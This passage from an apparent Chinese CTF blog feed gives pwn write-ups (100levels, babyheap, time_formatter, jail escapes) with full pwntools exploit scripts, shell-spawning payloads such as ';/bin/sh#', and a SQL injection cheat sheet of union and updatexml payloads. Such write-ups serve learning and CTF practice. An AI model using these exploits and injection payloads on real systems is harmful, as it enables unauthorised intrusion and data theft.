flag )</span><br><span class="line">  &#123;</span><br><span class="line">    sprintf((char *)&amp;v1, &quot;Hint: %p\n&quot;, &amp;system, &amp;system);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = &apos;N NWP ON&apos;;</span><br><span class="line">    v2 = &apos;UF O&apos;;</span><br><span class="line">    v3 = &apos;N&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">  return puts((const char *)&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>容易发现的漏洞就是check时的溢出，还有问题就是go初始时输入两次值，最后使用的是两次加起来的值，但是如果第一次输入的值小于等于0就不会初始化第一个值。</p><p>最刚开始的想法是通过溢出修改存储在bss段的flag位然后返回到主函数，再使用hint泄露system函数地址<br>但是因为程序开启了pie，因此bss段位置也就是不定的，而如果想要泄露libc，又因为是64位程序，因此需要gadget，但是gadgets的位置也因为pie变得位置不定，所以行不通。</p><p>再观察程序，发现：<br>hint函数是先将system函数地址读到了栈上，之后调用fprintf函数输出的，其地址为rbp-0x110<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_110         = qword ptr -110h</span><br><span class="line"></span><br><span class="line">mov     rax, cs:system_ptr</span><br><span class="line">mov     [rbp+var_110], rax</span><br></pre></td></tr></table></figure></p><p>而如果go读取的第一个数没有初始化的话，他的值就是栈上的值，而它的地址恰巧也是rbp-0x110<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__int64 num1; // [rsp+10h] [rbp-110h]</span><br></pre></td></tr></table></figure></p><p>所以我们按理说是可以利用那个对大小判断的函数来逐位爆破system的地址<br>这里需要注意的是如果和大于0进入check，如果顺着令其运行完会直接退出，所以也需要在check中溢出覆盖返回地址以便能够继续爆破</p><p>而覆盖的返回地址依旧是不确定的，观察程序运行时的内存映射，发现程序的最后vsyscall段是恒定不变的，我们可以利用它来绕过pie；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10i 0xffffffffff600400</span><br><span class="line">   0xffffffffff600400:mov    rax,0xc9</span><br><span class="line">   0xffffffffff600407:syscall </span><br><span class="line">   0xffffffffff600409:ret    </span><br><span class="line">   0xffffffffff60040a:int3   </span><br><span class="line">   0xffffffffff60040b:int3</span><br></pre></td></tr></table></figure></p><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>思路一没有复现成功，看到了大佬们的简单一点的思路</p><p>前面基本一致，但是不再去爆破system的地址，而是将其覆盖位one_gadget的地址，也就是计算二者偏移的差值然后将其加上去直接得到one_gadget RCE,可以看到这个地址被存放在了栈上，我们的目标就是在后面的栈溢出中想办法使得返回到此处。</p><p>执行最后一次时的栈情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">03:0018│ rsi  0x7ffe36cd7780 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">07:0038│      0x7ffe36cd77a0 ◂— 0x1ae00000000</span><br><span class="line">08:0040│      0x7ffe36cd77a8 ◂— 0x2b0000000a /* &apos;\n&apos; */</span><br><span class="line">09:0048│ rbp  0x7ffe36cd77b0 —▸ 0x7ffe36cd78e0 —▸ 0x7ffe36cd7920 —▸ 0x556f0672efd0 ◂— push   r15</span><br><span class="line">0a:0050│      0x7ffe36cd77b8 —▸ 0x556f0672ec8a ◂— test   eax, eax</span><br><span class="line">0b:0058│      0x7ffe36cd77c0 ◂— 0xfffffffffffffeda</span><br><span class="line">0c:0060│      0x7ffe36cd77c8 ◂— 0x556f5caa9f45       -------》 one_gadget 在这里</span><br></pre></td></tr></table></figure></p><p>我们就可以使用vsyscall中的不变量来使返回地址滑向此处执行one_gadget</p><ul><li>关于 vsyscall</li></ul><p>简单地说，现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">system_offset = 0x45390</span><br><span class="line">ret_address = 0xffffffffff600400</span><br><span class="line">target_offset = 0x4526a</span><br><span class="line"></span><br><span class="line">difference = target_offset - system_offset</span><br><span class="line"></span><br><span class="line">def answer(eqn):</span><br><span class="line">    parse = eqn[9:eqn.find(&quot;=&quot;)]</span><br><span class="line">    soln = eval(parse)</span><br><span class="line">    return soln</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    p = process(&quot;./100levels&quot;)</span><br><span class="line">    #p = remote(&quot;47.74.147.103&quot;, 20001)</span><br><span class="line"></span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(&quot;0&quot;)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(str(difference))</span><br><span class="line"></span><br><span class="line">    for i in range(99):</span><br><span class="line">        p.recvline_contains(&quot;Level&quot;)</span><br><span class="line">        eqn = p.clean()</span><br><span class="line"></span><br><span class="line">        soln = answer(eqn)</span><br><span class="line">        p.send(str(soln)+&quot;\x00&quot;)</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">    pay = str(soln) + &quot;\x00&quot;</span><br><span class="line">    pay = pay.ljust(56, &quot;B&quot;)</span><br><span class="line">    pay += p64(ret_address)*3</span><br><span class="line">    log.info(&quot;Injected our vsyscall ROPs&quot;)</span><br><span class="line"></span><br><span class="line">    p.send(pay)</span><br><span class="line">    p.clean()</span><br><span class="line"></span><br><span class="line">    p.success(&quot;Shell spawned! Enjoy!&quot;)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>未成功的思路一</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">sh=process(&apos;./100levels&apos;)</span><br><span class="line">#sh=remote(&apos;111.198.29.45&apos;,&apos;32440&apos;)</span><br><span class="line">elf = ELF(&apos;./100levels&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so&apos;)</span><br><span class="line"></span><br><span class="line">def go(level,more):</span><br><span class="line">sh.recvuntil(&apos;Choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;levels?\n&apos;)</span><br><span class="line">sh.sendline(str(level))</span><br><span class="line">sh.recvuntil(&apos;more?\n&apos;)</span><br><span class="line">sh.sendline(str(more))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def hint():</span><br><span class="line">sh.sendlineafter(&apos;Choice:\n&apos;,&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">def calc(answer):</span><br><span class="line">sh.sendlineafter(&apos;Answer:&apos;,answer)</span><br><span class="line"></span><br><span class="line">def leak():</span><br><span class="line">start = 0x700000000390</span><br><span class="line">for i in range(10,2,-1):</span><br><span class="line">for j in range(15,-1,-1):</span><br><span class="line">hint()</span><br><span class="line">addr_test = start+(1 &lt;&lt; (i*4)*j)</span><br><span class="line">go(0,-addr_test)</span><br><span class="line">a = sh.recvline()</span><br><span class="line"></span><br><span class="line">if &apos;Coward&apos; not in a:</span><br><span class="line">                start = addr_test</span><br><span class="line">log.info(&apos;check &apos;+ hex(addr_test))</span><br><span class="line">                break</span><br><span class="line">        pro = log.progress(&apos;go&apos;)</span><br><span class="line">        for i in range(99):</span><br><span class="line">            pro.status(&apos;level %d&apos;%(i+1))</span><br><span class="line">            calc(p64(0)*5)</span><br><span class="line">        #gdb.attach(sh)</span><br><span class="line">calc(p64(0)*5+p64(0xffffffffff600400)*3)</span><br><span class="line">       #gdb.attach(sh)</span><br><span class="line">pro.success(&apos;ok&apos;)</span><br><span class="line">return start + 0x100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system=leak()</span><br><span class="line">print system</span><br><span class="line"></span><br><span class="line">binsh_addr = system - libc.symbols[&apos;system&apos;]+libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line">pop_rdi_ret = system - libc.symbols[&apos;system&apos;]+0x21102</span><br><span class="line"></span><br><span class="line">pay = p64(pop_rdi_ret)+p64(binsh_addr)+p64(system)</span><br><span class="line">go(1,0)</span><br><span class="line">pay = &apos;0&apos;*0x38+pay</span><br><span class="line">calc(pay)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://bbs.ichunqiu.com/thread-43627-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-43627-1-1.html</a><br><a href="https://nandynarwhals.org/hitbgsec2017-1000levels/" target="_blank" rel="noopener">https://nandynarwhals.org/hitbgsec2017-1000levels/</a><br><a href="https://znqt.github.io/hitb-gsec-pwn-1000levels/" target="_blank" rel="noopener">https://znqt.github.io/hitb-gsec-pwn-1000levels/</a></p><h1 id="monkey"><a href="#monkey" class="headerlink" title="monkey"></a>monkey</h1><h2 id="题目-amp-分析-amp-exp"><a href="#题目-amp-分析-amp-exp" class="headerlink" title="题目 &amp; 分析 &amp; exp"></a>题目 &amp; 分析 &amp; exp</h2><p>算是js的沙箱逃逸，给了个The SpiderMonkey shell，可以查询到它的源码之类的东西，<br>可以发现其没有任何过滤，所以给个os.system(“/bin/sh”) 直接拿shell即可</p><h1 id="Escape-From-Jail-50"><a href="#Escape-From-Jail-50" class="headerlink" title="Escape_From_Jail-50"></a>Escape_From_Jail-50</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>python沙箱逃逸，只给了个远程连接，检测到被过滤的字符会报错</p><p>banned：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.  / &apos; /  import /flag /eval /exec / dir(__builtins__)无反馈 等等</span><br></pre></td></tr></table></figure></p><h2 id="分析-amp-exp"><a href="#分析-amp-exp" class="headerlink" title="分析 &amp; exp"></a>分析 &amp; exp</h2><p>许多常见的基本上都被过滤了</p><p>不能使用import关键字且不允许使用 “.”，一大部分路就被绝了,</p><p>os，未被过滤，但是基本调用需要”.”,所以需要其他方式。</p><p>查询资料发现 getattr函数可以使用</p><p>相关资料可以看菜鸟：<a href="http://www.runoob.com/python/python-func-getattr.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-getattr.html</a></p><p>getattr(os,”system”)(“/bin/sh”)</p><h1 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time_formatter"></a>time_formatter</h1><p>比较有意思的一个题目，刚开始没看懂题。。</p><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall print(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // r8</span><br><span class="line">  char command; // [rsp+8h] [rbp-810h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+808h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  if ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __snprintf_chk(&amp;command, 2048LL, 1LL, 2048LL, &quot;/bin/date -d @%d +&apos;%s&apos;&quot;, (unsigned int)time, ptr, a3);</span><br><span class="line">    __printf_chk(1LL, &quot;Your formatted time is: &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    if ( getenv(&quot;DEBUG&quot;) )</span><br><span class="line">      __fprintf_chk(stderr, 1LL, &quot;Running command: %s\n&quot;, &amp;command, v3);</span><br><span class="line">    setenv(&quot;TZ&quot;, value, 1);</span><br><span class="line">    system(&amp;command);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;You haven&apos;t specified a format!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>退出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __noreturn exit()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; // rax</span><br><span class="line">  char s; // [rsp+8h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v2; // [rsp+18h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  free__(ptr);</span><br><span class="line">  free__(value);</span><br><span class="line">  __printf_chk(1LL, &quot;Are you sure you want to exit (y/N)? &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  result = 0LL;</span><br><span class="line">  if ( (s &amp; 0xDF) == 89 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;OK, exiting.&quot;);</span><br><span class="line">    result = 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-amp-amp-exp"><a href="#分析-amp-amp-exp" class="headerlink" title="分析&amp;&amp;exp"></a>分析&amp;&amp;exp</h2><p>问题出在退出时先free然后再询问是否退出，这个时候选择不退出的话就会出现UAF漏洞</p><p>在system中执行command命令，command字符串通过snprintf_chk函数拼接起来，可以百度一下这个函数的用法，注意字符串/bin/date -d @%d +’%s’，按照linux 64的函数传参顺序，分别是rdi rsi rdx rcx r8 r9 然后是栈 ，所以此时%s对应第一个入栈的参数，也就是rax 也就是qword_602118，所以只要控制了qword_602118，就可以执行任意系统命令（注意闭合单引号）。</p><p>所以依次执行 1，5 / N ，3 / ‘;/bin/sh#’ , 4 即可</p><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><h2 id="题目-amp-amp-分析"><a href="#题目-amp-amp-分析" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>正常题目，edit时没有检查存储的size</p><p>所以虽然保护全开，我们仍然可以使用溢出来overlap来泄露地址及其他</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#sh=process(&apos;./babyheap&apos;)</span><br><span class="line">sh = remote(&apos;111.198.29.45&apos;,&apos;31717&apos;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;./libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def new(length,con):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendline(str(length))</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def edit(idx,length,con):</span><br><span class="line">        sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">        sh.sendline(str(idx))</span><br><span class="line">        sh.sendline(str(length))</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">        sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(0x10,&apos;a&apos;*0x10)  #0</span><br><span class="line">new(0x10,&apos;b&apos;*0x10)  #1</span><br><span class="line">new(0x10,&apos;c&apos;*0x10)  #2</span><br><span class="line">new(0x10,&apos;d&apos;*0x10)  #3</span><br><span class="line">new(0x10,&apos;e&apos;*0x10)  #4</span><br><span class="line"></span><br><span class="line">#--------------leak heap base----------------</span><br><span class="line">edit(0,0x20,&apos;a&apos;*0x18+p64(0x41))</span><br><span class="line">dele(1)</span><br><span class="line">new(0x30,&apos;b&apos;*0x18+p64(0x21)+&apos;c&apos;*0x10)  #1</span><br><span class="line">dele(4)</span><br><span class="line">dele(2)</span><br><span class="line">show(1)</span><br><span class="line">sh.recvuntil(p64(0x21))</span><br><span class="line">heap = u64(sh.recv(8))-0x80</span><br><span class="line">print &apos;heap_base: &apos;+hex(heap)</span><br><span class="line">#--------------leak libc base----------------</span><br><span class="line">new(0x10,&apos;b&apos;*0x10)  #2</span><br><span class="line">new(0x10,&apos;e&apos;*0x10)  #4</span><br><span class="line">new(0x10,&apos;f&apos;*0x10)  #5</span><br><span class="line"></span><br><span class="line">new(0x10,&apos;deadbeef&apos;*2) #6</span><br><span class="line">#new(0x90,&apos;c&apos;*0x90)</span><br><span class="line"></span><br><span class="line">edit(0,0x28,&apos;a&apos;*0x18+p64(0xa1)+&apos;a&apos;*8)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">dele(1)</span><br><span class="line">new(0x10,&apos;b&apos;*0x10)  #1</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">show(2)</span><br><span class="line">main_arena = u64(sh.recv(8))-88</span><br><span class="line">malloc_hook = main_arena - 0x10</span><br><span class="line">libc.base = malloc_hook - libc.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">one_gadget = libc.base+0x4526a</span><br><span class="line">print &apos;libc: &apos;+hex(libc.base)</span><br><span class="line">#------------hjack malloc_hook to getshell----------</span><br><span class="line">new(0x70,&apos;c&apos;*0x60+p64(0)+p64(0x31))  #2 &amp; 7</span><br><span class="line">edit(1,0x28,&apos;b&apos;*0x18+p64(0x71)+&apos;c&apos;*8)</span><br><span class="line">dele(7)</span><br><span class="line">edit(2,8,p64(main_arena-0x33))</span><br><span class="line">new(0x60,&apos;c&apos;*0x60)</span><br><span class="line">new(0x63,&apos;a&apos;*0x13+p64(one_gadget)+p64(0)*9)</span><br><span class="line">new(1,&apos;a&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;100levels&quot;&gt;&lt;a href=&quot;#100levels&quot; class=&quot;headerlink&quot; title=&quot;100levels&quot;&gt;&lt;/a&gt;100levels&lt;/h1&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="stack" scheme="http://siriuswhiter.tk/categories/stack/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Sql Injection</title>
    <link href="http://siriuswhiter.tk/2019/04/01/sql-injection/"/>
    <id>http://siriuswhiter.tk/2019/04/01/sql-injection/</id>
    <published>2019-04-01T02:18:22.000Z</published>
    <updated>2019-04-05T01:41:46.105Z</updated>
    
    <content type="html"><![CDATA[<p>#Sql Injection</p><h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><ol><li>注释： </li></ol><ul><li>–   （注意后面必须要留空格，否则无法达到注释的效果；</li><li>#</li></ul><ol start="2"><li>group_concat （连接字符串，一次性注入；</li></ol><h2 id="检测过滤字符"><a href="#检测过滤字符" class="headerlink" title="检测过滤字符"></a>检测过滤字符</h2><p>‘^(text)^’</p><p>如果text为假，那么页面就会显示正确，所以假如检测是否过滤union, 写入’^(length(union)==0)^’，如果正确就是过滤了</p><h2 id="应对过滤字符"><a href="#应对过滤字符" class="headerlink" title="应对过滤字符"></a>应对过滤字符</h2><ol start="0"><li>大小写绕过； 因为sql本身对大小写不敏感，也就是SELECT与 select本身是一致的，有的检查过松是可以通过大小写绕过的比如说 SeLEct</li><li>双写 ；因为很多情况下是将被过滤的字符替换为空，这种情况下就可以使用双写绕过，比如说 selselectect</li><li>/**/ ;</li><li>updatexml 报错注入;（最终内部细节与其他的基本一致；</li><li>concat被过滤：make_set() lpad()、reverse()、repeat()、export_set()（lpad()、reverse()、repeat()等冷门字符串处理函数</li><li>使用运算符号； 运算符进行运算的时候会先观察左右两端的数据类型是否相同，不同的话就会进行数据强制的转换；所以如果知道是字符串的话，会被强制转换为0；<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from info where username=0; </span><br><span class="line">select * from info where username=&apos;admin&apos;-0-&apos;&apos;; --&gt;减法</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* table: </span><br><span class="line">select * from info where id=-1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) ;  --&gt; updatexml 三个参数，不随表行数变化。</span><br></pre></td></tr></table></figure><h2 id="mysql-约束攻击"><a href="#mysql-约束攻击" class="headerlink" title="mysql 约束攻击"></a>mysql 约束攻击</h2><p>由于mysql对于字符串验证不严格，因而在检验时，’admin’与’admin   ‘被认为是等价的，也就是说可以使非管理员用户以管理员身份读取数据库信息</p><p>## </p><h3 id="database"><a href="#database" class="headerlink" title="database"></a>database</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select database();</span><br></pre></td></tr></table></figure><h3 id="table"><a href="#table" class="headerlink" title="table"></a>table</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from info where id=-1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database();</span><br></pre></td></tr></table></figure><h3 id="column"><a href="#column" class="headerlink" title="column"></a>column</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from info where id=-1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;info&apos;;</span><br></pre></td></tr></table></figure><h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>-r + ‘filename’<br>-p + ‘sqlinjection_name’   –dbs<br>-D + ‘database_name’  –tables<br>-T + ‘table_name’     –columns<br>-C + ‘column_name’    –dump</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#Sql Injection&lt;/p&gt;
&lt;h2 id=&quot;常用语法&quot;&gt;&lt;a href=&quot;#常用语法&quot; class=&quot;headerlink&quot; title=&quot;常用语法&quot;&gt;&lt;/a&gt;常用语法&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;注释： &lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;–   （注意后面
      
    
    </summary>
    
      <category term="web" scheme="http://siriuswhiter.tk/categories/web/"/>
    
    
      <category term="web" scheme="http://siriuswhiter.tk/tags/web/"/>
    
      <category term="sql" scheme="http://siriuswhiter.tk/tags/sql/"/>
